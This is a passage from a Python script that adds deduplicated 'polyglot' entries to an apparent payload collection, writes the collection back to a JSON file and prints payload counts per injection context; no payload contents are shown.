        "id": pid,
        "name": poly["name"],
        "contexts": poly["contexts"],
        "payload": poly["payload"],
    })
    existing_poly.add(poly["payload"])
    added += 1


# --- Write back -----------------------------------------------------------
with open(PATH, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2, ensure_ascii=False)

print(f"[+] Added {added} payloads (total: {len(data['payloads'])}, "
      f"polyglots: {len(data['polyglots'])})")
contexts = sorted(set(p["context"] for p in data["payloads"]))
print(f"[+] Contexts: {len(contexts)} -> {contexts}")
# Per-context count
from collections import Counter
counts = Counter(p["context"] for p in data["payloads"])
for ctx, n in sorted(counts.items(), key=lambda x: -x[1]):
    print(f"    {ctx:30s} {n}")
